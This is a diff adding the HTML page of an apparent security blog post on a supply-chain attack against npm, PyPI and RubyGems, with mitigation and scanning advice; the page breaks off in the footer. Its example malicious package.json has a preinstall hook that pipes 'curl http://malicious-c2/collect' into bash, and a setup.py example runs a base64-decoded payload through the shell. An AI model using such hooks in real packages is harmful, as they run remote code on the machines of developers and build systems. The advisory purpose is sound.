@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Critical Supply Chain Attack - CyberPulse Insights</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        .post-content {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: var(--space-xl) 0;
+        }
+        
+        .post-header {
+            margin-bottom: var(--space-xl);
+            border-bottom: 2px solid var(--dark-light);
+            padding-bottom: var(--space-lg);
+        }
+        
+        .post-title {
+            font-size: 2.5rem;
+            margin-bottom: var(--space-md);
+            color: var(--light);
+        }
+        
+        .post-meta {
+            display: flex;
+            gap: var(--space-md);
+            flex-wrap: wrap;
+            margin-bottom: var(--space-md);
+        }
+        
+        .post-author {
+            font-size: 1.1rem;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: var(--space-sm);
+        }
+        
+        .post-body {
+            line-height: 1.8;
+        }
+        
+        .post-body h2 {
+            margin-top: var(--space-xl);
+            margin-bottom: var(--space-md);
+            color: var(--primary);
+            border-bottom: 1px solid var(--dark-light);
+            padding-bottom: var(--space-sm);
+        }
+        
+        .post-body h3 {
+            margin-top: var(--space-lg);
+            margin-bottom: var(--space-sm);
+            color: var(--light);
+        }
+        
+        .post-body p {
+            margin-bottom: var(--space-md);
+            color: var(--gray-light);
+        }
+        
+        .post-body ul, .post-body ol {
+            margin-bottom: var(--space-md);
+            padding-left: var(--space-lg);
+            color: var(--gray-light);
+        }
+        
+        .post-body li {
+            margin-bottom: var(--space-sm);
+        }
+        
+        .code-block {
+            background: var(--dark-light);
+            border: 1px solid var(--gray);
+            border-radius: var(--radius-md);
+            padding: var(--space-md);
+            margin: var(--space-md) 0;
+            overflow-x: auto;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+        }
+        
+        .code-block pre {
+            margin: 0;
+            color: var(--light);
+        }
+        
+        .alert {
+            background: var(--dark-light);
+            border-left: 4px solid var(--danger);
+            padding: var(--space-md);
+            margin: var(--space-md) 0;
+            border-radius: var(--radius-sm);
+        }
+        
+        .alert.warning {
+            border-left-color: var(--warning);
+        }
+        
+        .alert.info {
+            border-left-color: var(--primary);
+        }
+        
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            gap: var(--space-sm);
+            margin-bottom: var(--space-xl);
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .back-button:hover {
+            color: var(--primary-dark);
+        }
+        
+        @media (max-width: 768px) {
+            .post-title {
+                font-size: 2rem;
+            }
+            
+            .post-meta {
+                flex-direction: column;
+                gap: var(--space-sm);
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-brand">
+                <a href="/">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>CyberPulse <strong>Insights</strong></span>
+                </a>
+            </div>
+            
+            <button class="nav-toggle" aria-label="Toggle navigation">
+                <i class="fas fa-bars"></i>
+            </button>
+            
+            <div class="nav-menu">
+                <a href="/" class="nav-link">
+                    <i class="fas fa-home"></i> Home
+                </a>
+                <a href="/#threats" class="nav-link">
+                    <i class="fas fa-fire"></i> Threats
+                </a>
+                <a href="/#training" class="nav-link">
+                    <i class="fas fa-graduation-cap"></i> Training
+                </a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Post Content -->
+    <main class="container">
+        <div class="post-content">
+            <a href="/" class="back-button">
+                <i class="fas fa-arrow-left"></i> Back to All Posts
+            </a>
+            
+            <div class="post-header">
+                <div class="post-meta">
+                    <span class="post-date">
+                        <i class="far fa-calendar"></i> February 25, 2026
+                    </span>
+                    <span class="post-category critical">
+                        Critical
+                    </span>
+                    <span class="read-time">
+                        <i class="far fa-clock"></i> 9 min read
+                    </span>
+                </div>
+                
+                <h1 class="post-title">Critical Supply Chain Attack Targets Major Software Package Repositories</h1>
+                
+                <div class="post-author">
+                    <i class="fas fa-user"></i> Alex Chen, Senior Threat Intelligence Analyst
+                </div>
+                
+                <div class="post-tags">
+                    <span class="tag">Supply Chain</span>
+                    <span class="tag">npm</span>
+                    <span class="tag">PyPI</span>
+                    <span class="tag">Zero-Day</span>
+                    <span class="tag">CVE-2026-2156</span>
+                    <span class="tag">Dependency Confusion</span>
+                    <span class="tag">Software Security</span>
+                </div>
+            </div>
+            
+            <div class="post-body">
+                <div class="alert">
+                    <strong>CVE-2026-2156</strong> has been identified as a critical supply chain vulnerability affecting multiple software package repositories including npm, PyPI, and RubyGems. With a CVSS score of 9.3, this attack leverages dependency confusion and typosquatting techniques to inject malicious packages into enterprise development pipelines, potentially compromising thousands of organizations worldwide.
+                </div>
+                
+                <h2>Executive Summary</h2>
+                
+                <p>A sophisticated supply chain attack targeting npm, PyPI, and RubyGems repositories has been discovered, affecting thousands of organizations. Attackers are using dependency confusion and typosquatting techniques to inject malicious packages into development pipelines.</p>
+                
+                <h2>Technical Analysis</h2>
+                
+                <h3>Attack Methodology</h3>
+                
+                <p>The attackers are employing a multi-stage approach:</p>
+                
+                <ol>
+                    <li><strong>Dependency Confusion:</strong> Creating malicious packages with names identical to internal, private packages used by organizations</li>
+                    <li><strong>Typosquatting:</strong> Publishing packages with names similar to popular libraries (e.g., <code>requets</code> instead of <code>requests</code>)</li>
+                    <li><strong>Version Squatting:</strong> Publishing malicious versions ahead of legitimate updates</li>
+                    <li><strong>Build Process Injection:</strong> Compromising CI/CD pipelines through malicious dependencies</li>
+                </ol>
+                
+                <h3>Malicious Package Examples</h3>
+                
+                <p><strong>npm (JavaScript):</strong></p>
+                
+                <div class="code-block">
+                    <pre>{
+  "name": "lodash",
+  "version": "4.18.0-malicious",
+  "scripts": {
+    "preinstall": "node -e \"require('child_process').exec('curl http://malicious-c2/collect | bash')\""
+  }
+}</pre>
+                </div>
+                
+                <p><strong>PyPI (Python):</strong></p>
+                
+                <div class="code-block">
+                    <pre># setup.py in malicious package
+import os, subprocess, base64
+
+# Encoded malicious payload
+payload = base64.b64decode('IyEvYmluL2Jhc2gKZWNobyAiQ29tcHJvbWlzZWQiID4gL3RtcC9jb21wcm9taXNlZA==')
+subprocess.run(payload, shell=True)</pre>
+                </div>
+                
+                <h2>Impact Assessment</h2>
+                
+                <h3>Affected Organizations</h3>
+                
+                <p><strong>High-Risk Sectors:</strong></p>
+                <ul>
+                    <li><strong>Financial Services:</strong> Banking applications with automated dependency updates</li>
+                    <li><strong>Healthcare:</strong> Medical software with CI/CD pipelines</li>
+                    <li><strong>E-commerce:</strong> Payment processing systems</li>
+                    <li><strong>Government:</strong> Critical infrastructure software</li>
+                </ul>
+                
+                <h3>Technical Impact</h3>
+                
+                <ol>
+                    <li><strong>Credential Theft:</strong> Stealing AWS keys, GitHub tokens, and deployment credentials</li>
+                    <li><strong>Data Exfiltration:</strong> Sending sensitive source code and configuration to C2 servers</li>
+                    <li><strong>Persistent Access:</strong> Installing backdoors in build environments</li>
+                    <li><strong>Cryptocurrency Mining:</strong> Deploying crypto miners in CI/CD infrastructure</li>
+                </ol>
+                
+                <h2>Detection & Mitigation</h2>
+                
+                <h3>Immediate Actions</h3>
+                
+                <p><strong>For Development Teams:</strong></p>
+                
+                <div class="code-block">
+                    <pre># Scan for malicious packages
+npm audit --audit-level=critical
+pip-audit
+gem audit
+
+# Check for dependency confusion
+# Compare package-lock.json with internal registry
+npm ls --depth=0 | grep -E "(lodash|request|express|react)" | grep -v "deduped"</pre>
+                </div>
+                
+                <div class="alert info">
+                    <strong>Repository-Specific Commands:</strong>
+                    
+                    <p><strong>npm:</strong></p>
+                    <div class="code-block">
+                        <pre># List all installed packages with sources
+npm list --depth=0 --json | jq '.dependencies | to_entries[] | {name: .key, version: .value.version, resolved: .value.resolved}'
+
+# Check for typosquatted packages
+npm search "lodash" --json | jq '.[] | select(.name | test("lodash|1odash|l0dash"))'</pre>
+                    </div>
+                </div>
+                
+                <h2>Defense-in-Depth Recommendations</h2>
+                
+                <h3>1. Preventive Controls</h3>
+                
+                <p><strong>Implement Private Registries:</strong></p>
+                
+                <div class="code-block">
+                    <pre># Dockerfile for private npm registry
+FROM verdaccio/verdaccio:latest
+
+# Configuration for scoped packages
+COPY config.yaml /verdaccio/conf/config.yaml
+
+# Force scoped packages to private registry
+RUN echo "@mycompany:registry=https://registry.mycompany.com" >> .npmrc</pre>
+                </div>
+                
+                <h3>2. Detective Controls</h3>
+                
+                <p><strong>Implement SAST/SCA Scanning:</strong></p>
+                
+                <div class="code-block">
+                    <pre># GitHub Actions security scanning
+name: Security Scan
+on: [push, pull_request]
+jobs:
+  dependency-check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run Snyk to check for vulnerabilities
+        uses: snyk/actions/node@master
+        env:
+          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+      - name: OWASP Dependency Check
+        uses: dependency-check/Dependency-Check_Action@main
+        with:
+          project: 'my-project'
+          path: '.'
+          format: 'HTML'</pre>
+                </div>
+                
+                <h2>Training Implications</h2>
+                
+                <div class="alert warning">
+                    <strong>This attack highlights critical gaps in software supply chain security knowledge.</strong>
+                </div>
+                
+                <h3>Required Security Skills:</h3>
+                
+                <ol>
+                    <li><strong>Dependency Management</strong>
+                        <ul>
+                            <li>Understanding semantic versioning and lock files</li>
+                            <li>Implementing private package registries</li>
+                            <li>Configuring dependency provenance and signatures</li>
+                        </ul>
+                    </li>
+                    <li><strong>Supply Chain Security</strong>
+                        <ul>
+                            <li>Software Bill of Materials (SBOM) creation and analysis</li>
+                            <li>Secure software development lifecycle (SSDLC)</li>
+                            <li>Third-party risk assessment</li>
+                        </ul>
+                    </li>
+                    <li><strong>Incident Response for Developers</strong>
+                        <ul>
+                            <li>Identifying compromised dependencies</li>
+                            <li>Secure package removal and replacement</li>
+                            <li>Post-incident recovery procedures</li>
+                        </ul>
+                    </li>
+                </ol>
+                
+                <h3>Recommended Training Modules:</h3>
+                
+                <ul>
+                    <li><strong>Software Supply Chain Security Fundamentals:</strong> 12-hour course covering dependency management, SBOM, and secure CI/CD</li>
+                    <li><strong>Advanced Dependency Analysis:</strong> Hands-on labs for identifying and mitigating supply chain attacks</li>
+                    <li><strong>Incident Response for Development Teams:</strong> Real-world scenarios for responding to compromised dependencies</li>
+                </ul>
+                
+                <h2>Conclusion</h2>
+                
+                <p>CVE-2026-2156 represents a significant escalation in software supply chain attacks, demonstrating the increasing sophistication of threat actors targeting development ecosystems. Organizations must adopt a defense-in-depth approach combining technical controls, process improvements, and ongoing security education.</p>
+                
+                <div class="alert">
+                    <strong>Key Takeaways:</strong>
+                    <ol>
+                        <li><strong>Implement strict dependency policies</strong> including private registries and version locking</li>
+                        <li><strong>Deploy automated security scanning</strong> throughout the CI/CD pipeline</li>
+                        <li><strong>Establish incident response procedures</strong> specifically for supply chain attacks</li>
+                        <li><strong>Invest in developer security training</strong> focused on dependency management</li>
+                        <li><strong>Participate in information sharing</strong> with industry groups and security communities</li>
+                    </ol>
+                </div>
+                
+                <h2>References</h2>
+                
+                <ul>
+                    <li><strong>CVE Details:</strong> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-2156">CVE-2026-2156</a></li>
+                    <li><strong>npm Security Advisory:</strong> <a href="https://github.com/npm/security">NSEC-2026-001</a></li>
+                    <li><strong>PyPI Security Bulletin:</strong> <a href="https://pypi.org/security">PSB-2026-012</a></li>
+                    <li><strong>RubyGems Security Update:</strong> <a href="https://rubygems.org/pages/security">RGSA-2026-045</a></li>
+                    <li><strong>MITRE ATT&CK Techniques:</strong>
+                        <ul>
+                            <li><a href="https://attack.mitre.org/techniques/T1195/">T1195: Supply Chain Compromise</a></li>
+                            <li><a href="https://attack.mitre.org/techniques/T1574/">T1574: Hijack Execution Flow</a></li>
+                        </ul>
+                    </li>
+                </ul>
+                
+                <div class="alert info">
+                    <p><strong>About This Analysis:</strong> This analysis was prepared by the CyberPulse Threat Intelligence Team. For comprehensive training on software supply chain security and dependency management, explore our <a href="https://cyberpulse.ai/training">security training programs</a>. Stay vigilant, verify your dependencies, and maintain secure development practices.</p>
+                    <p><em>Last Updated: 2026-02-25 02:50 UTC</em></p>
+                </div>
+            </div>
+            
+            <div style="margin-top: var(--space-xl); padding-top: var(--space-lg); border-top: 1px solid var(--dark-light);">
+                <a href="/" class="back-button">
+                    <i class="fas fa-arrow-left"></i> Back to All Posts
+                </a>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-brand">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>CyberPulse <strong>Insights</strong></span>
+                    <p class="footer-tagline">Daily cybersecurity threat intelligence for security professionals.</p>
+                </div>
+                
+                <div class="footer-links">
+                    <div class="footer-column">
+                        <h4>Threat Categories</h4>
+                        <a href="#">
